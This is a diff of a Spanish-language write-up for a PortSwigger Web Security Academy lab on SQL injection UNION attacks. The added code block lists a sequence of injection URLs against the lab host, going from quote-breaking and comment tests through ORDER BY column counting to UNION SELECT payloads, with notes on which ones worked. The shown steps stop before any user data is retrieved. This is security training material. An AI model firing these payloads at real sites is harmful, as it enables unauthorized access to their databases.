@@ -49,7 +49,26 @@ To solve the lab, perform a **SQL injection UNION attack** that retrieves all us
 
 ## Solución:
 
-1. Abrir laboratorio y buscar en donde me puedo autenticar
+````py
+https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories
+
+https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' 
+
+https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' -- -
+
+https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' ORDER BY 2 -- -
+
+https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' UNION SELECT 1,2 -- -
+
+# Working!!! Invisible
+https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' UNION SELECT null,null -- -
+# Working!!! Visible
+https://0a1a002f037876e380d71c89001a0081.web-security-academy.net/filter?category=Accessories' UNION SELECT '1','2' -- -
+
+
+
+
+````
 
 
 
